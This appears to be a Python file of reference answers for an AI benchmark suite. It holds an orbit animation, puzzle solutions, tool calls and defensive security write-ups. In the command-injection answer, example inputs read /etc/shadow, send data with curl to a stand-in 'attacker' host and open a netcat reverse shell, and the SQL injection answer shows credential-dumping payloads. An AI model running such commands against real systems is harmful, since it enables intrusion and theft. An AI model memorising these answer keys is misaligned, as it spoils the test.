"""Claude Opus 5 responses to the benchmark suite, for use as a reference ceiling.

These were written by hand (no endpoint call) and are scored by the SAME scorers
in suite.py, so the comparison is mechanical rather than self-assessed. Tool
calls are given in the same OpenAI shape the scorers expect.

Caveat worth stating plainly: this is a reference ceiling produced without the
latency/token constraints a served model works under, and the author of these
answers also wrote the scorers. The scorers are exact-match and regex, so there
is no grading discretion -- but task SELECTION could in principle favour them.
Read it as "what good looks like", not as a head-to-head on equal footing.
"""

KEPLER_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Keplerian Orbit</title>
<style>
  html,body{margin:0;height:100%;background:#0b0b10;color:#d8d8e0;
            font:13px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
  #wrap{display:flex;height:100%;align-items:center;justify-content:center;gap:24px}
  canvas{background:#08080d;border-radius:10px;box-shadow:0 0 0 1px #23232e}
  #hud{min-width:220px}
  h1{font-size:14px;margin:0 0 12px;letter-spacing:.04em;text-transform:uppercase;color:#8d8da0}
  .row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #1c1c26}
  .k{color:#8d8da0}.v{font-variant-numeric:tabular-nums;color:#eaeaf2}
  .note{margin-top:14px;color:#6f6f82;font-size:11px}
</style>
</head>
<body>
<div id="wrap">
  <canvas id="c" width="720" height="560"></canvas>
  <div id="hud">
    <h1>Orbital elements</h1>
    <div class="row"><span class="k">eccentricity e</span><span class="v" id="ecc">0.600</span></div>
    <div class="row"><span class="k">mean anomaly M</span><span class="v" id="M">0.0&deg;</span></div>
    <div class="row"><span class="k">eccentric anom. E</span><span class="v" id="E">0.0&deg;</span></div>
    <div class="row"><span class="k">true anomaly &nu;</span><span class="v" id="nu">0.0&deg;</span></div>
    <div class="row"><span class="k">radius r</span><span class="v" id="r">0.00 AU</span></div>
    <div class="row"><span class="k">speed v</span><span class="v" id="v">0.00 AU/yr</span></div>
    <div class="row"><span class="k">Newton iters</span><span class="v" id="it">0</span></div>
    <div class="note">Star sits at the focus (offset a&middot;e from the ellipse
    centre). Equal-area wedges are shaded at equal time intervals &mdash; they
    differ in shape but not in area, which is Kepler's second law.</div>
  </div>
</div>
<script>
(() => {
  const cv = document.getElementById('c'), g = cv.getContext('2d');
  const CX = cv.width * 0.58, CY = cv.height / 2;   // star drawn here

  // --- orbital elements -------------------------------------------------
  const a = 200;            // semi-major axis, px
  const e = 0.6;            // eccentricity
  const b = a * Math.sqrt(1 - e * e);
  const c = a * e;          // centre-to-focus distance
  const T = 8.0;            // period, seconds
  const AU = 120;           // px per AU, for readouts
  // Choose mu so the period really is T: T^2 = 4*pi^2*a^3/mu
  const mu = 4 * Math.PI * Math.PI * a * a * a / (T * T);

  // --- solve Kepler's equation M = E - e*sin(E) by Newton-Raphson -------
  // No closed form exists. Start from E0 = M + e*sin(M), which converges in
  // ~3 iterations even at e = 0.6.
  let iters = 0;
  function solveKepler(M) {
    M = ((M % (2 * Math.PI)) + 2 * Math.PI) % (2 * Math.PI);
    let E = M + e * Math.sin(M);
    let n = 0;
    for (; n < 30; n++) {
      const f  = E - e * Math.sin(E) - M;     // residual
      const fp = 1 - e * Math.cos(E);         // d/dE
      const dE = f / fp;
      E -= dE;
      if (Math.abs(dE) < 1e-12) break;
    }
    iters = n + 1;
    return E;
  }

  // Position relative to the FOCUS (the star), from eccentric anomaly.
  function stateAt(E) {
    const x = a * (Math.cos(E) - e);     // = r*cos(nu)
    const y = b * Math.sin(E);           // = r*sin(nu)
    const r = a * (1 - e * Math.cos(E));
    const nu = Math.atan2(y, x);
    const v = Math.sqrt(mu * (2 / r - 1 / a));   // vis-viva
    return {x, y, r, nu, v};
  }

  // --- precompute equal-time wedges to make the 2nd law visible ---------
  const WEDGES = 12, SUB = 24;
  const wedges = [];
  for (let k = 0; k < WEDGES; k++) {
    const pts = [];
    for (let s = 0; s <= SUB; s++) {
      const M = 2 * Math.PI * (k + s / SUB) / WEDGES;
      const st = stateAt(solveKepler(M));
      pts.push([st.x, st.y]);
    }
    wedges.push(pts);
  }

  const trail = [];
  const t0 = performance.now();

  function frame(now) {
    const t = (now - t0) / 1000;
    const M = 2 * Math.PI * (t % T) / T;
    const E = solveKepler(M);
    const st = stateAt(E);

    g.clearRect(0, 0, cv.width, cv.height);

    // equal-area wedges: same area, visibly different angular extent
    for (let k = 0; k < WEDGES; k++) {
      g.beginPath();
      g.moveTo(CX, CY);
      for (const [x, y] of wedges[k]) g.lineTo(CX + x, CY - y);
      g.closePath();
      g.fillStyle = k % 2 ? 'rgba(90,130,220,0.10)' : 'rgba(90,130,220,0.05)';
      g.fill();
    }

    // the ellipse itself -- centre is offset from the star by c = a*e
    g.beginPath();
    g.ellipse(CX - c, CY, a, b, 0, 0, 2 * Math.PI);
    g.strokeStyle = '#2e2e42'; g.lineWidth = 1.5; g.stroke();

    // both foci: the star occupies one of them
    g.fillStyle = '#33334a';
    g.beginPath(); g.arc(CX - 2 * c, CY, 3, 0, 2 * Math.PI); g.fill();

    // trail
    trail.push([st.x, st.y]);
    if (trail.length > 260) trail.shift();
    g.beginPath();
    trail.forEach(([x, y], i) => i ? g.lineTo(CX + x, CY - y) : g.moveTo(CX + x, CY - y));
    g.strokeStyle = 'rgba(120,170,255,0.55)'; g.lineWidth = 2; g.stroke();

    // star at the focus
    const grd = g.createRadialGradient(CX, CY, 0, CX, CY, 26);
    grd.addColorStop(0, '#fff3c4'); grd.addColorStop(0.4, '#ffcc55');
    grd.addColorStop(1, 'rgba(255,180,40,0)');
    g.fillStyle = grd;
    g.beginPath(); g.arc(CX, CY, 26, 0, 2 * Math.PI); g.fill();
    g.fillStyle = '#ffd76a';
    g.beginPath(); g.arc(CX, CY, 8, 0, 2 * Math.PI); g.fill();

    // radius vector + planet
    g.beginPath(); g.moveTo(CX, CY); g.lineTo(CX + st.x, CY - st.y);
    g.strokeStyle = 'rgba(150,150,190,0.35)'; g.lineWidth = 1; g.stroke();
    g.fillStyle = '#8fb8ff';
    g.beginPath(); g.arc(CX + st.x, CY - st.y, 6, 0, 2 * Math.PI); g.fill();

    const deg = x => (x * 180 / Math.PI + 360) % 360;
    document.getElementById('M').textContent  = deg(M).toFixed(1) + '°';
    document.getElementById('E').textContent  = deg(E).toFixed(1) + '°';
    document.getElementById('nu').textContent = deg(st.nu).toFixed(1) + '°';
    document.getElementById('r').textContent  = (st.r / AU).toFixed(3) + ' AU';
    document.getElementById('v').textContent  = (st.v / AU).toFixed(3) + ' AU/yr';
    document.getElementById('it').textContent = iters;

    requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
})();
</script>
</html>"""

SEC_SQLI = """Two distinct vulnerabilities.

**1. SQL injection (CWE-89).** `uid` goes straight from the query string into
the SQL text via string concatenation. `?id=1 OR 1=1` dumps another user;
`?id=1 UNION SELECT password,1 FROM users` exfiltrates credentials. The fix is a
parameterized/prepared statement so the value can never be parsed as SQL.

**2. Reflected XSS (CWE-79).** `row[0]` and `row[1]` are interpolated into HTML
with no escaping. If a display name contains `<script>`, it executes in the
victim's origin. Use a template engine with contextual autoescaping, or escape
explicitly.

A third, lesser issue: `row` is used without checking for `None`, so an unknown
id raises and may leak a stack trace. And the connection is never closed.

```python
import sqlite3
from flask import request, abort, render_template_string
from markupsafe import escape

@app.route('/user')
def user():
    uid = request.args.get('id', type=int)      # reject non-integers outright
    if uid is None:
        abort(400)
    with sqlite3.connect('app.db') as conn:
        # Parameterized: the driver binds uid as a value, never as SQL text.
        row = conn.execute(
            "SELECT name, email FROM users WHERE id = ?", (uid,)
        ).fetchone()
    if row is None:
        abort(404)
    # escape() neutralises HTML metacharacters in both fields.
    return f"<h1>Welcome {escape(row[0])}</h1><p>{escape(row[1])}</p>"
```

Prefer `render_template` with Jinja autoescaping over building HTML by hand."""

SEC_CMDINJ = """**Command injection (CWE-78).** `os.popen` runs its argument through
`/bin/sh`, so every shell metacharacter in `hostname` is interpreted. Exploits:

- `ping_host("x; cat /etc/shadow")` — `;` terminates the ping and runs a second command
- `ping_host("x && curl attacker/$(whoami)")` — chaining plus command substitution
- `` ping_host("x `id`") `` — backticks substitute before ping ever runs
- `ping_host("x | nc attacker 4444 -e /bin/sh")` — pipe to a reverse shell

Since this is an *admin* tool it likely runs privileged, so this is a direct path
to remote code execution as root.

```python
import ipaddress
import subprocess


def ping_host(hostname: str, timeout: int = 5) -> str:
    # Defence 1: validate. Only accept a literal IP address, which cannot
    # contain shell metacharacters by construction. If DNS names must be
    # supported, match a strict hostname regex instead -- never a denylist.
    try:
        ip = str(ipaddress.ip_address(hostname))
    except ValueError:
        raise ValueError("hostname must be a literal IP address")

    # Defence 2: argument list, no shell. With shell=False (the default) the
    # list is passed to execve directly, so there is no shell to inject into.
    proc = subprocess.run(
        ["ping", "-c", "1", "-W", str(timeout), "--", ip],
        capture_output=True, text=True, timeout=timeout + 2, check=False,
    )
    return proc.stdout
```

Key points: `shell=False`, an argument **list** rather than a string, `--` to stop
option parsing, validation before the call, and an explicit timeout so a hung
ping can't exhaust workers."""

SEC_CRYPTO = """Four problems.

1. **MD5 is a fast general-purpose digest, not a password hash.** It is designed
   for speed — commodity GPUs do tens of billions of MD5s per second — so an
   offline attacker brute-forces the whole keyspace cheaply. MD5 is also
   collision-broken, though that matters less here than its speed.
2. **No salt.** Identical passwords produce identical digests, so rainbow tables
   apply and equal hashes reveal that two users share a password.
3. **No work factor.** Nothing can be tuned upward as hardware improves.
4. **`==` comparison is not constant-time**, leaking information through timing.

Use a memory-hard KDF. Argon2id is the current recommendation; bcrypt and
scrypt are acceptable; PBKDF2 only where FIPS compliance forces it.

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError, VerificationError

# Salting, the work factor, and the encoded parameters are all handled
# internally; the salt is random per-hash and stored inside the output string.
_ph = PasswordHasher(time_cost=3, memory_cost=64 * 1024, parallelism=4)


def hash_password(pw: str) -> str:
    return _ph.hash(pw)


def check_password(pw: str, stored: str) -> bool:
    try:
        # verify() is constant-time with respect to the digest.
        return _ph.verify(stored, pw)
    except (VerifyMismatchError, VerificationError):
        return False
```

If you cannot add a dependency, `hashlib.scrypt` with a random 16-byte salt plus
`hmac.compare_digest` for the comparison is a reasonable fallback. When migrating,
re-hash on next successful login rather than forcing a global reset."""

SEC_LOGS = """**This is not just a brute-force attempt — it succeeded, and the host
should be treated as compromised.**

Reading the sequence:

- `03:11:02`–`03:11:07`: five failed logins in five seconds from `203.0.113.44`,
  cycling `admin`, `root`, `oracle`, `postgres`, `test`. Classic automated
  credential brute force / dictionary attack against common service accounts.
- `03:12:41`: **`Accepted password for deploy` from the same IP.** The attacker
  found a valid account. `deploy` was not in the earlier failures, so they either
  had the credential already or it fell to a wordlist between log lines.
- `03:12:58`: seventeen seconds later, `deploy` uses **sudo to root** to install
  **netcat** — a tool with essentially no legitimate need on a production web
  host and a standard building block for a reverse shell or data exfiltration.

So: successful unauthorised access, followed immediately by privilege escalation
to root and staging of tooling. Note also that `deploy` has sudo rights, and
password authentication is enabled for it.

**The two most important actions:**

1. **Contain and treat as compromised.** Isolate the host from the network
   (don't power it off — you'd lose volatile evidence), revoke the `deploy`
   session, rotate every credential and SSH key reachable from that box, and
   audit for persistence: `authorized_keys`, cron/systemd timers, new users,
   modified binaries. Root was obtained, so the machine cannot be trusted;
   plan to rebuild from a known-good image rather than clean in place.
2. **Close the entry vector.** Disable SSH password authentication entirely
   (`PasswordAuthentication no`, key-based only), which defeats this whole class
   of attack. Block/rate-limit the source, add fail2ban, and restrict SSH to a
   VPN or bastion.

Follow-ups: review why `deploy` has unrestricted sudo, enable MFA, and ship auth
logs off-host so an attacker with root can't edit them."""

SEC_TAR = """```python
import os
import tarfile


def safe_extract(archive_path: str, dest_dir: str) -> None:
    \"\"\"Extract a tar archive, refusing any member that escapes dest_dir.

    Defends against the "tarslip"/"Zip Slip" class (CWE-22).
    \"\"\"
    # Defence 1: resolve the destination once, following any symlinks, so that
    # every later comparison is against a canonical absolute path.
    dest = os.path.realpath(dest_dir)
    os.makedirs(dest, exist_ok=True)

    with tarfile.open(archive_path) as tar:
        for member in tar.getmembers():
            # Defence 2: reject absolute paths ("/etc/passwd") and Windows-style
            # drive paths, which would otherwise ignore dest entirely.
            if os.path.isabs(member.name) or member.name.startswith(("/", "\\\\")):
                raise ValueError(f"absolute path in archive: {member.name}")

            # Defence 3: reject traversal. Resolve the target and require it to
            # stay under dest. Using realpath (not normpath) also catches the
            # case where an EARLIER member created a symlink we would follow.
            target = os.path.realpath(os.path.join(dest, member.name))
            if target != dest and not target.startswith(dest + os.sep):
                raise ValueError(f"path traversal in archive: {member.name}")

            # Defence 4: refuse symlinks and hardlinks outright. A link whose
            # target is resolved *after* extraction can redirect a later write
            # outside dest, so validating them is subtle -- rejecting is safer.
            if member.issym() or member.islnk():
                raise ValueError(f"link member not allowed: {member.name}")

            # Defence 5: only ordinary files and directories. Device nodes,
            # FIFOs and setuid bits have no business in an untrusted archive.
            if not (member.isfile() or member.isdir()):
                raise ValueError(f"unsupported member type: {member.name}")
            member.mode &= 0o777 & ~0o7000      # strip setuid/setgid/sticky

            tar.extract(member, dest)
```

On Python 3.12+ prefer the built-in guard — `tar.extractall(dest, filter='data')`
— which implements this policy in the standard library. The explicit version
above is what you need on older runtimes, and it fails closed on anything
unexpected rather than trying to sanitise it."""

# ---------------------------------------------------------------------------
# id -> response object in the same shape run.py builds from the API
# ---------------------------------------------------------------------------
ANSWERS = {
    "kepler_orbit": {"content": KEPLER_HTML},
    "reason_trains": {"content":
        "At 11:00 the cyclist has ridden 2 h x 20 km/h = 40 km, leaving 260 km "
        "between them. They then close at 20 + 60 = 80 km/h, so they meet after "
        "260 / 80 = 3.25 h = 3 h 15 min.\n\n**14:15**"},
    "reason_trace": {"content":
        "Tracing each element:\n"
        "- 1 (1 mod 3 = 1): insert at front -> [1]\n"
        "- 2 (2 mod 3 = 2): reverse -> [1]\n"
        "- 3 (0): append 3*2=6 -> [1, 6]\n"
        "- 4 (1): insert at front -> [4, 1, 6]\n"
        "- 5 (2): reverse -> [6, 1, 4]\n"
        "- 6 (0): append 6*2=12 -> [6, 1, 4, 12]\n"
        "- 7 (1): insert at front -> [7, 6, 1, 4, 12]\n\n"
        "Output:\n[7, 6, 1, 4, 12]"},
    "reason_constraint": {"content":
        "From (2), the queue is on a server alphabetically after gamma, and delta "
        "is the only one, so **delta = queue**.\n"
        "From (3) beta is not cache or queue, so beta is database or web.\n"
        "From (1) alpha is not database or web, so alpha is cache or queue; queue "
        "is taken, so **alpha = cache**.\n"
        "From (4) gamma is not web, and cache/queue are taken, so "
        "**gamma = database**.\n"
        "That leaves **beta = web**.\n\n"
        "- alpha: cache\n- beta: web\n- gamma: database\n- delta: queue"},
    "reason_longctx": {"content": "PLUTONIUM-7734"},

    "tool_basic": {"content": "", "tool_calls": [{
        "id": "call_1", "type": "function",
        "function": {"name": "get_weather",
                     "arguments": '{"city": "Reykjavik", "units": "celsius"}'}}]},
    "tool_select": {"content": "", "tool_calls": [{
        "id": "call_2", "type": "function",
        "function": {"name": "search_files",
                     "arguments": '{"pattern": "TODO", "path": "/home/tate/projects"}'}}]},
    "tool_restraint": {"content":
        "HTTP stands for **HyperText Transfer Protocol** — the application-layer "
        "request/response protocol underlying the web. No tool needed for that."},
    "tool_typed_args": {"content": "", "tool_calls": [{
        "id": "call_3", "type": "function",
        "function": {"name": "search_files",
                     "arguments": '{"pattern": "^Failed password", "path": "/var/log", "case_sensitive": true}'}}]},

    "sec_sqli": {"content": SEC_SQLI},
    "sec_cmdinj": {"content": SEC_CMDINJ},
    "sec_crypto": {"content": SEC_CRYPTO},
    "sec_logs": {"content": SEC_LOGS},
    "sec_secure_impl": {"content": SEC_TAR},
}
